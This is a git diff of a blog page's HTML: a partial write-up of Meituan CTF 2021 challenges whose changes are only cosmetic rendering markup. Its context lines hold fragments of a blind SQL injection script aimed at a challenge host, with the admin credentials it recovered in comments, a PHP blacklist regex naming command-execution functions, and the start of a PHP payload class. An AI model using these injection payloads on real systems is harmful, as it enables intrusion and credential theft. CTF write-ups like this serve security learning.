@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.87.0" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -14,7 +14,7 @@
 
     <title>美团CTF2021部分writeup | tyskillのBlog</title>
 
-    <link rel="stylesheet" href="/css/meme.min.09e7384df2ebf8f7760291a0d443770f44b39f5563546dd950293ed79e8d779b.css"/>
+    <link rel="stylesheet" href="/css/meme.min.12acc0ca7f74225e7b015741d28e3038696047c86698a0fb722ce126d04c739e.css"/>
 
     
     
@@ -268,7 +268,7 @@
 <p>exp</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -314,7 +314,7 @@
 </span><span class="lnt">44
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
 <span class="kn">import</span> <span class="nn">time</span>
 <span class="kn">import</span> <span class="nn">string</span>
 <span class="kn">import</span> <span class="nn">re</span>
@@ -349,10 +349,10 @@
         <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
         <span class="k">if</span> <span class="s1">&#39;flag is not here!&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
             <span class="n">flag</span> <span class="o">+=</span> <span class="n">i</span>
-            <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
             <span class="k">break</span>
     <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">==</span> <span class="n">length</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="n">hex2ord</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">lstrip</span><span class="p">(</span><span class="s2">&#34;^&#34;</span><span class="p">)))</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">hex2ord</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">lstrip</span><span class="p">(</span><span class="s2">&#34;^&#34;</span><span class="p">)))</span>
         <span class="k">break</span>
 <span class="c1"># username: admin</span>
 <span class="c1"># password: This_1s_thE_Passw0rd</span>
@@ -365,7 +365,7 @@
 <p>脚本</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -407,7 +407,7 @@
 </span><span class="lnt">40
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span> <span class="kn">as</span> <span class="nn">req</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="nn">req</span>
 <span class="kn">import</span> <span class="nn">time</span>
 
 <span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;http://eci-2ze3abqpovgs8cju593e.cloudeci1.ichunqiu.com&#34;</span>
@@ -426,26 +426,26 @@
         <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="nb">max</span> <span class="o">+</span> <span class="nb">min</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
         <span class="c1"># sql = &#34;passwd&#34; # GoODLUcKcTFer202OHAckFuN</span>
         <span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;user&#34;</span> <span class="c1"># admin</span>
-        <span class="n">SQL</span> <span class="o">=</span> <span class="n">f</span><span class="s2">&#34;1&#39;&amp;if(ascii(substr({sql},{j},1))&gt;{mid},0,1)&amp;&#39;1&#34;</span>
+        <span class="n">SQL</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;1&#39;&amp;if(ascii(substr(</span><span class="si">{</span><span class="n">sql</span><span class="si">}</span><span class="s2">,</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,0,1)&amp;&#39;1&#34;</span>
         <span class="c1"># res = session.get(url=target+SQL)</span>
         <span class="n">data</span><span class="p">[</span><span class="s2">&#34;passwd&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">SQL</span>
         <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">target</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
         <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-        <span class="k">print</span><span class="p">(</span><span class="n">SQL</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">SQL</span><span class="p">)</span>
         <span class="k">if</span> <span class="s2">&#34;user.php&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span> <span class="c1"># 大于成立</span>
             <span class="k">if</span> <span class="nb">max</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="nb">min</span><span class="p">:</span>
                 <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">max</span><span class="p">)</span>
-                <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+                <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
                 <span class="k">break</span>
             <span class="nb">min</span> <span class="o">=</span> <span class="n">mid</span>
         <span class="k">else</span><span class="p">:</span>
             <span class="k">if</span> <span class="nb">max</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="nb">min</span><span class="p">:</span>
                 <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">min</span><span class="p">)</span>
-                <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+                <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
                 <span class="k">break</span>
             <span class="nb">max</span> <span class="o">=</span> <span class="n">mid</span>
     <span class="k">if</span> <span class="n">length</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">strip</span><span class="p">()):</span>
-        <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
         <span class="k">break</span>
 </code></pre></td></tr></table></div>
 </div>
@@ -456,7 +456,7 @@
 <p>插入php代码之前要先了解一下waf</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -468,7 +468,7 @@
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$parm</span><span class="p">){</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$parm</span><span class="p">){</span>
     <span class="nv">$blacklist</span><span class="o">=</span><span class="s2">&#34;/flag|pcntl|system|exec|fread|file|fpassthru|popen|proc|ld|putenv|passthru|`|\.|</span><span class="se">\\</span><span class="s2">\|#|</span><span class="se">\\</span><span class="s2">$|[0-9]|_|get|~|</span><span class="se">\\</span><span class="s2">^|eval|assert|open|write|include|require/is&#34;</span><span class="p">;</span>
     <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="nv">$blacklist</span><span class="p">,</span><span class="nv">$parm</span><span class="p">);</span>
 <span class="k">public</span> <span class="k">function</span> <span class="nf">write</span><span class="p">(){</span>
@@ -485,7 +485,7 @@
 <p>先从<code>phpinfo()</code>开始</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -501,7 +501,7 @@
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="k">class</span> <span class="nc">preload</span><span class="p">{</span>
     <span class="k">public</span> <span class="nv">$class</span><span class="p">;</span>
     <span class="k">public</span> <span class="nv">$contents</span><span class="p">;</span>
